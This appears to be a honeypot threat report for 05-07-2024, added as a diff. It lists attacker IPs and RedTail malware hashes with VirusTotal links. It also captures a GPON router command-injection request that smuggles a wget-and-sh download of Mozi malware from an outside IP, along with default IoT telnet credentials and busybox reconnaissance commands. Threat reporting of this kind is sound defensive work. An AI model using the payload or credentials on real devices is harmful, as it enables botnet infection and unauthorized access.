@@ -1,0 +1,71 @@
+Top 5 IPs for 05-07-2024 :
+
+115.133.187.116
+85.133.222.157
+94.156.67.110
+164.138.103.24
+158.220.95.133
+
+Malware Observed:
+
+
+File name : clean.sh
+d46555af1173d22f07c37ef9c1e0e74fd68db022f2b6fb3ab5388d2c5bc6a98e
+https://www.virustotal.com/gui/file/d46555af1173d22f07c37ef9c1e0e74fd68db022f2b6fb3ab5388d2c5bc6a98e
+
+
+File name : redtail.arm7
+77785555e9100c27422ba12e4d5c6443fa5d786ee4701f7cfc2127cfbcef1633
+https://www.virustotal.com/gui/file/77785555e9100c27422ba12e4d5c6443fa5d786ee4701f7cfc2127cfbcef1633
+
+File name : redtail.arm8
+27cdb4014df5749c7e707be43a44ea089b170415b2a9312f1f891e4874721076
+https://www.virustotal.com/gui/file/27cdb4014df5749c7e707be43a44ea089b170415b2a9312f1f891e4874721076
+
+
+File name : redtail.i686
+cee19ca9a49ca69b57e7bb5a31c09fa9b292b5d78e46245d7b7cc1df4ac88f0c
+https://www.virustotal.com/gui/file/cee19ca9a49ca69b57e7bb5a31c09fa9b292b5d78e46245d7b7cc1df4ac88f0c
+
+
+File name : redtail.x86_64
+0318b7e5e90a1b4ee502d73eec8c9c1c4eaac375b5d12dbee664bc4e12e53392
+https://www.virustotal.com/gui/file/0318b7e5e90a1b4ee502d73eec8c9c1c4eaac375b5d12dbee664bc4e12e53392
+
+
+Commands/exploits observed:
+
+POST /GponForm/diag_Form?images/ HTTP/1.1
+Host: 127.0.0.1:8080
+Connection: keep-alive
+Accept-Encoding: gzip, deflate
+Accept: */*
+User-Agent: Hello, World
+Content-Length: 118
+
+XWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host=``;wget+http://61.3.142.175:51244/Mozi.m+-O+->/tmp/gpon8080;sh+/tmp/gpon8080&ipv=0
+
+
+admin
+...ipcam_rt5350
+root
+...juantech
+root
+...founder88
+root
+...zlxx.
+enable
+system
+shell
+sh
+cat /proc/mounts; /bin/busybox OINDQ
+cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox OINDQ
+tftp; wget; /bin/busybox OINDQ
+dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s
+/bin/busybox OINDQ
+
+
+
+
+
+
